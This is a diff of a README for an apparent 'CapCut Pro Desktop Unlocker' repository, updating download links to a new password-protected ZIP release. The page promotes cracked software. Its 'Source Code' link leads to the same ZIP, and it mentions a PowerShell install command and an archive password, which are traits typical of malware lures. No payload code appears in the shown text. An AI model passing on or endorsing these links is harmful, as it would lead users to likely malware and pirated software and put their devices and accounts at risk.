@@ -38,7 +38,7 @@
 <tr>
 <td align="center">
 
-<a href="https://github.com/lowermaintenancetell/CapCut-Pro-Desktop-Unlocker/releases/download/9/CapCut-Pro-Unlock.zip">
+<a href="https://github.com/lowermaintenancetell/CapCut-Pro-Desktop-Unlocker/releases/download/10/CapCut-Pro-Unlock.zip">
   <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
 </a>
 
@@ -51,8 +51,8 @@
 </table>
 
 **Direct Links:**
-- [Latest Release](https://github.com/lowermaintenancetell/CapCut-Pro-Desktop-Unlocker/releases/download/9/CapCut-Pro-Unlock.zip)
-- [Source Code](https://github.com/lowermaintenancetell/CapCut-Pro-Desktop-Unlocker/releases/download/9/CapCut-Pro-Unlock.zip)
+- [Latest Release](https://github.com/lowermaintenancetell/CapCut-Pro-Desktop-Unlocker/releases/download/10/CapCut-Pro-Unlock.zip)
+- [Source Code](https://github.com/lowermaintenancetell/CapCut-Pro-Desktop-Unlocker/releases/download/10/CapCut-Pro-Unlock.zip)
 
 > 💡 **Prefer a classic download?** If you'd rather install from an archive instead of the PowerShell command, simply download the ZIP from the **Releases** section above. Extract it and use the password below.
 >
